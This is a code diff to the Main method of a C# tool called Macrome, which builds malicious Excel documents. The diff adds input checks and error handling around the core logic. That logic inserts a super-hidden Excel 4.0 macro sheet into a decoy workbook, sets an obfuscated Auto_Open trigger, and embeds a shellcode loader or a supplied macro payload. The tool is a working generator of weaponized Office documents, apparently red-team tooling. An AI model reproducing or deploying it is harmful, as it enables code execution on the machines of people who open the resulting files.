@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.CommandLine.DragonFruit;
 using System.IO;
 using System.Linq;
 using System.Reflection;
@@ -36,43 +37,58 @@ namespace Macrome
         public static void Main(FileInfo decoyDocument = null, FileInfo payload = null, PayloadType payloadType = PayloadType.Shellcode, 
                                 string macroSheetName = "Sheet2", string outputSheetName = "output.xls", string[] args = null)
         {
-            Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
-
-            List<BiffRecord> defaultMacroSheetRecords = GetDefaultMacroSheetRecords();
-
-            string decoyDocPath = decoyDocument.FullName;
-
-            WorkbookStream wbs = LoadDecoyDocument(decoyDocPath);
-            WorkbookEditor wbe = new WorkbookEditor(wbs);
-
-            wbe.AddMacroSheet(defaultMacroSheetRecords, macroSheetName, BoundSheet8.HiddenState.SuperHidden);
-
-            wbe.AddLabel("Auto_Open", 0, 0);
-
-            List<string> macros = null;
-            byte[] binaryPayload = null;
-
-            switch (payloadType)
+            try
             {
-                case PayloadType.Shellcode:
-                    macros = MacroPatterns.GetBinaryLoaderPattern(macroSheetName);
-                    binaryPayload = File.ReadAllBytes(payload.FullName);
-                    break;
-                case PayloadType.Macro:
-                    macros = File.ReadAllLines(payload.FullName).ToList();
-                    break;
-                default:
-                    throw new ArgumentException(string.Format("Invalid PayloadType {0}", payloadType), "payloadType");
+                if (decoyDocument == null || payload == null)
+                {
+                    Console.WriteLine("decoy-document and payload must be specified. Run with -h for usage instructions.");
+                    return;
+                }
+
+                Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
+
+                List<BiffRecord> defaultMacroSheetRecords = GetDefaultMacroSheetRecords();
+
+                string decoyDocPath = decoyDocument.FullName;
+
+                WorkbookStream wbs = LoadDecoyDocument(decoyDocPath);
+                WorkbookEditor wbe = new WorkbookEditor(wbs);
+
+                wbe.AddMacroSheet(defaultMacroSheetRecords, macroSheetName, BoundSheet8.HiddenState.SuperHidden);
+
+                wbe.AddLabel("Auto_Open", 0, 0);
+
+                List<string> macros = null;
+                byte[] binaryPayload = null;
+
+                switch (payloadType)
+                {
+                    case PayloadType.Shellcode:
+                        macros = MacroPatterns.GetBinaryLoaderPattern(macroSheetName);
+                        binaryPayload = File.ReadAllBytes(payload.FullName);
+                        break;
+                    case PayloadType.Macro:
+                        macros = File.ReadAllLines(payload.FullName).ToList();
+                        break;
+                    default:
+                        throw new ArgumentException(string.Format("Invalid PayloadType {0}", payloadType),
+                            "payloadType");
+                }
+
+                wbe.SetMacroSheetContent(macros, binaryPayload);
+
+                wbe.ObfuscateAutoOpen();
+
+                ExcelDocWriter writer = new ExcelDocWriter();
+                string outputPath = AssemblyDirectory + Path.DirectorySeparatorChar + outputSheetName;
+                Console.WriteLine("Writing document to {0}", outputPath);
+                writer.WriteDocument(outputPath, wbe.WbStream);
+
             }
-
-            wbe.SetMacroSheetContent(macros, binaryPayload);
-
-            wbe.ObfuscateAutoOpen();
-
-            ExcelDocWriter writer = new ExcelDocWriter();
-            string outputPath = AssemblyDirectory + Path.DirectorySeparatorChar + outputSheetName;
-            Console.WriteLine("Writing document to {0}", outputPath);
-            writer.WriteDocument(outputPath, wbe.WbStream);
+            catch (Exception e)
+            {
+                Console.WriteLine(e);
+            }
         }
 
         private static WorkbookStream LoadDecoyDocument(string decoyDocPath)
